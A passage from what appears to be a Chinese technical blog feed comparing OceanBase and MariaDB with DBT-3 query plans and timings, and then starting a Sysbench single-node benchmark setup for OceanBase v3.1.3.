class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR         <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">4485685</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> SUBPLAN SCAN    <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">2035</span>     <span class="operator">|</span><span class="number">4485296</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">WINDOW</span> <span class="keyword">FUNCTION</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4483943</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4482777</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4464880</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>part    <span class="operator">|</span><span class="number">206</span>      <span class="operator">|</span><span class="number">261589</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2229397</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(VIEW1.lineitem.l_extendedprice) <span class="operator">/</span> <span class="number">7.0</span>]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(VIEW1.lineitem.l_extendedprice)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW1.lineitem.l_extendedprice]), <span class="keyword">filter</span>([VIEW1.lineitem.l_quantity <span class="operator">&lt;</span> VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)]),</span><br><span class="line">      access([VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)], [VIEW1.lineitem.l_quantity], [VIEW1.lineitem.l_extendedprice])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([<span class="number">0.2</span> <span class="operator">*</span> T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      win_expr(T_FUN_SUM(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">      win_expr(T_FUN_COUNT(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil), sort_keys([part.__pk_increment, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([part.p_partkey <span class="operator">=</span> lineitem.l_partkey]), other_conds(nil)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([part.p_partkey], [part.__pk_increment]), <span class="keyword">filter</span>([part.p_container <span class="operator">=</span> <span class="string">&#x27;WRAP DRUM&#x27;</span>], [part.p_brand <span class="operator">=</span> <span class="string">&#x27;Brand#43&#x27;</span>]),</span><br><span class="line">      access([part.p_partkey], [part.p_brand], [part.p_container], [part.__pk_increment]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.013</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-18-执行计划">SQL-18 执行计划</h3>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR          <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">--------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>LIMIT             <span class="operator">|</span>        <span class="operator">|</span><span class="number">100</span>      <span class="operator">|</span><span class="number">8933274</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> TOP<span class="operator">-</span>N SORT       <span class="operator">|</span>        <span class="operator">|</span><span class="number">100</span>      <span class="operator">|</span><span class="number">8933260</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">JOIN</span>       <span class="operator">|</span>        <span class="operator">|</span><span class="number">3297</span>     <span class="operator">|</span><span class="number">8925142</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">3330</span>     <span class="operator">|</span><span class="number">8609940</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    SUBPLAN SCAN  <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">3321</span>     <span class="operator">|</span><span class="number">5444449</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">3321</span>     <span class="operator">|</span><span class="number">5443991</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2097020</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>    SUBPLAN SCAN  <span class="operator">|</span>VIEW3   <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">2666737</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">2459704</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>orders  <span class="operator">|</span><span class="number">1500000</span>  <span class="operator">|</span><span class="number">552665</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>   SUBPLAN SCAN   <span class="operator">|</span>VIEW2   <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">256232</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>    HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">235529</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">62265</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [<span class="built_in">cast</span>(VIEW2.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW3.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil), limit(<span class="number">100</span>), <span class="keyword">offset</span>(nil)</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil), sort_keys([VIEW3.orders.o_totalprice, <span class="keyword">DESC</span>], [VIEW3.orders.o_orderDATE, <span class="keyword">ASC</span>]), topn(<span class="number">100</span>)</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([VIEW2.customer.c_name], [VIEW2.customer.c_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW2.customer.c_custkey <span class="operator">=</span> VIEW3.orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)], [VIEW1.T_FUN_SUM(lineitem.l_quantity)], [VIEW3.orders.o_custkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([VIEW3.orders.o_orderkey <span class="operator">=</span> VIEW1.l_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([VIEW1.l_orderkey], [VIEW1.T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW1.l_orderkey], [VIEW1.T_FUN_SUM(lineitem.l_quantity)])</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([lineitem.l_orderkey], [T_FUN_SUM(lineitem.l_quantity)]), <span class="keyword">filter</span>([T_FUN_SUM(lineitem.l_quantity) <span class="operator">&gt;</span> ?]),</span><br><span class="line">      <span class="keyword">group</span>([lineitem.l_orderkey]), agg_func([T_FUN_SUM(lineitem.l_quantity)])</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_quantity]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_quantity]), partitions(p0)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([VIEW3.orders.o_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW3.orders.o_custkey], [VIEW3.orders.o_orderkey], [VIEW3.orders.o_orderDATE], [VIEW3.orders.o_totalprice], [VIEW3.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE], [orders.o_totalprice], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE], [orders.o_totalprice]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([orders.o_orderkey], [orders.o_custkey], [orders.o_orderDATE], [orders.o_totalprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([orders.o_orderkey], [orders.o_custkey], [orders.o_orderDATE], [orders.o_totalprice]), partitions(p0)</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([VIEW2.customer.c_custkey], [VIEW2.customer.c_name], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([VIEW2.customer.c_custkey], [VIEW2.customer.c_name], [VIEW2.T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_COUNT(<span class="operator">*</span>)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_name]), agg_func([T_FUN_COUNT(<span class="operator">*</span>)])</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_name]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.018</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>如果说单体OB和MariaDB的基准性能测试没有明显差距的话，那么对于复杂查询的处理上，就可以看出OB要明显优于MariaDB。<br>
下表为上述6个SQL的查询时长，SQL-5 / SQL-17 / SQL-18 这三条语句在MariaDB上运行时长都是分钟级，而在OB上则是秒级出结果。</p>
<table>
<thead>
<tr>
<th>SQL</th>
<th>OceanBase</th>
<th>OceanBase(合并后)</th>
<th>MariaDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQL-1</td>
<td>10.285 sec</td>
<td>9.108 sec</td>
<td>13.61 sec</td>
</tr>
<tr>
<td>SQL-5</td>
<td>24.593 sec</td>
<td>4.477 sec</td>
<td>23 min 52.91 sec</td>
</tr>
<tr>
<td>SQL-6</td>
<td>3.386 sec</td>
<td>2.557 sec</td>
<td>2.69 sec</td>
</tr>
<tr>
<td>SQL-10</td>
<td>6.043 sec</td>
<td>3.727 sec</td>
<td>43.29 sec</td>
</tr>
<tr>
<td>SQL-17</td>
<td>3.800 sec</td>
<td>2.901 sec</td>
<td>6 min 25.23 sec</td>
</tr>
<tr>
<td>SQL-18</td>
<td>7.332 sec</td>
<td>6.016 sec</td>
<td>1 min 43.55 sec</td>
</tr>
</tbody>
</table>
<p>在查询过程中，监控操作系统CPU使用率可以清晰的看到，MariaDB上运行SQL时，同一时间只占用一个CPU，使用率达100%，而OB则可以将CPU运算分配到多个CPU核心上。<br>
对于MariaDB而言，CPU使用瓶颈问题是根源性设计问题，而OceanBase则有效地解决了这一痛点。</p>
<p>同时，经对比可以发现，触发合并后的查询速度要优于刚导入数据时，从执行计划中也可以看到有几个SQL原先会出现VIEW，而在合并后，VIEW消失，执行计划步骤减少。<br>
不过，在测试时也发现，部分SQL在合并后第一次运行SQL时耗时要比后续再次运行要久一些。</p>
<p>到此，我想说对于国产数据库我们应该抱有信心，对于OceanBase而言，这不只是一款分布式数据库。<br>
OceanBase是有一体化设计理念的数据库，犹如“定海神针”一般，可以在业务初期就开始投入使用，并随着业务呈指数级增长的同时，OceanBase可以顺滑扩容，而不用像MySQL那样到达一定数量级就不得不考虑重构系统，做“分库分表”等架构调整。</p>
<p>期待 OceanBase 4.0，期待官方可以开源更多 OB 性能监控工具及调优工具。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a class="link"   href="https://open.oceanbase.com/docs" >OceanBase 社区版 文档中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/doc/58980" >【最全】OceanBase 社区版入门到实战教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/dbt3-automation-scripts/" >dbt3-automation-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.3-perf-testing-single-node/">大才能否小用？OceanBase一体化场景测试</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-perf-testing-with-databench-t/">使用 Databench-T 对 OceanBase 社区版 v3.1.2 进行性能测试</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/397405" >https://www.modb.pro/db/397405 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>mariadb</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
        <tag>性能测试</tag>
        <tag>DBT-3</tag>
      </tags>
  </entry>
  <entry>
    <title>大才能否小用？OceanBase 一体化场景测试</title>
    <url>/2022/oceanbase/ob-v3.1.3-perf-testing-single-node/</url>
    <content><![CDATA[<h2 id="背景说明">背景说明</h2>
<p>“国产数据库”、“原生分布式数据库”的概念实际上已经落地有几年了，但是很多同学还持观望态度或抱有困惑：<br>
当前业务量不高，用MySQL即可支撑流量，伴随业务迅猛增长，可能会带来横向扩展性问题，未来会产生扩容瓶颈及扩容高成本问题。<br>
新项目想上马分布式数据库，但又担心成本太高，能否先上一台或几台，之后再进行扩容，并需要考虑扩容平滑度如何。<br>
很多分布式数据库其实是由很多组件构成，而作为原生分布式数据库的OceanBase可以单体独立使用，但单体使用场景下性能较MySQL如何。</p>
<img  alt="ob-sysbench-word-art.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220420-bbeb5f59-a79a-401b-b118-3adea3ea26e2.png"
                      referrerpolicy="no-referrer"
                >
<p>OceanBase（以下简称“OB”）作为国产金融级原生分布式数据库，有着良好的高可用性、可扩展性和兼容性。<br>
了解过OB的同学都知道，OB在一个机器上只需运行一个observer二进制文件即可，即只需observer这一个组件即可完成最小的数据库单元部署。<br>
这种一体化设计的理念，对于刚接触OB的DBA们非常友好，无需安装其他组件，即便是非专业DBA也可以轻松管理，初期学习成本较低。（这里再旁引OB云平台管理管理软件–<a class="link"   href="https://open.oceanbase.com/docs/ocp-cn/V3.1.1/10000000000012325" >OCP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，一款白屏可视化管理软件，帮您轻松管理OB集群）<br>
鉴于此背景，本文将使用Sysbench工具对OceanBase和MariaDB的单体性能进行初步测试和对比。</p>
<h2 id="测试环境">测试环境</h2>
<blockquote>
<p>8c16g VM<br>
CentOS 7.9<br>
OceanBase 社区版 v3.1.3<br>
OBD 1.2.1<br>
MariaDB 10.6.7<br>
Sysbench 1.1.0-ead2689</p>
</blockquote>
<p>注：<br>
为了排除Sysbench本身对于测试的影响，这里将使用同一个Sysbench分别对OB和MariaDB进行测试。<br>
即，对OB进行测试时，需要指定Sysbench的二进制文件(<code>--sysbench-bin</code>)和脚本路径(<code>--sysbench-script-dir</code>)。</p>
<h3 id="OB测试环境">OB测试环境</h3>
<p>环境搭建这里不再赘述，具体流程已在我之前的文章中阐述，<a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">《基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法》</a> 。<br>
环境搭建完成后，需要创建一个tpcc租户和用户，专门用来进行测试。</p>
<p>这里本地启动的OB所使用的配置文件如下：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">oceanbase-ce:</span></span><br><span class="line">  <span class="attr">servers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.101</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">home_path:</span> <span class="string">/data/ob/ob_local_data</span></span><br><span class="line">    <span class="attr">datafile_size:</span> <span class="string">10G</span></span><br><span class="line">    <span class="attr">memory_limit:</span> <span class="string">12G</span></span><br><span class="line">    <span class="attr">system_memory:</span> <span class="string">2G</span></span><br><span class="line">    <span class="attr">cpu_count:</span> <span class="number">8</span></span><br></pre></td></tr></table></figure></div>
<p>当前OB集群运行状态如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">obd cluster list</span></span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|                      Cluster List                         |</span><br><span class="line">+------+----------------------------------+-----------------+</span><br><span class="line">| Name | Configuration Path               | Status (Cached) |</span><br><span class="line">+------+----------------------------------+-----------------+</span><br><span class="line">| obce | /home/shawnyan/.obd/cluster/obce | running         |</span><br><span class="line">+------+----------------------------------+-----------------+</span><br></pre></td></tr></table></figure></div>
<h3 id="MariaDB测试环境">MariaDB测试环境</h3>
<p>这里先行交代MariaDB的测试环境，实际测试时，先将MariaDB停止，只运行OB。<br>
完成OB部分的测试后，将OB停止，启动MariaDB。</p>
<p>MariaDB直接使用RPM进行安装，服务用systemd进行管理，运行状态如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl status mariadb</span></span><br><span class="line">* mariadb.service - MariaDB 10.6.7 database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2022-04-19 10:15:39 JST; 1 day 3h ago</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-OBD-对-OB-进行测试">使用 OBD 对 OB 进行测试</h2>
<p>OBD 全称为 OceanBase Deployer，是 OceanBase 开源软件的安装部署工具。OBD 同时也是包管理器，可以用来管理 OceanBase 所有的开源软件。</p>
<p>这里使用到了OBD测试功能，可以使用其对OB进行一键测试。</p>
<p>Sysbench是一种常用的性能测试工具，可以对MySQL及其分支和PostgreSQL进行性能测试。由于OB社区版兼容MySQL模式，所以使用Sysbench对OB进行性能测试。<br>
Sysbench参数较多，虽然OB兼容MySQL模式，但是由于引入了多租户特性，所以在使用Sysbench时需要额外进行参数设定。</p>
<p>从OBD的 <code>obd test sysbench</code> 功能的相关源码中，我们可以知悉，<br>
为了适配OB进行了一些封装，比如增加一些参数的检查、设定：<br>
<a class="link"   href="https://github.com/oceanbase/obdeploy/blob/master/plugins/sysbench/3.1.0/run_test.py#L181" >https://github.com/oceanbase/obdeploy/blob/master/plugins/sysbench/3.1.0/run_test.py#L181 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
